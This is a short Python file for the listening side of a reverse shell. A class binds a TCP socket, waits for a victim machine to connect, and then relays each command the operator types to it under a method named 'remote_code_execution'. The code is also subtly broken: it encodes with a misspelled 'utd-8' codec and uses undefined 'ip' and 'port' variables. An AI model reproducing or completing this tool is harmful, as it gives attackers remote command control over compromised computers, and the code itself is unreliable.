import socket

class Connections_Listener:
  def __init__(self, ip, port):
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((ip, port))
    listener.listen(0)
    print("[+] Waiting for a connection")
    self.connection, address = listener.accept()
    print("[+] Got a connection")
  
  def remote_code_execution(self, command):
    self.connection.send(command.encode('utd-8'))
    return self.connection.recv(1024).decode('utf-8')
  
  def start(self):
    while True:
      input_command = input(">>> ")
      result = self.remote_code_execution(input_command)
      print(result)

listen = Connections_Listener(ip, port)
listen.start()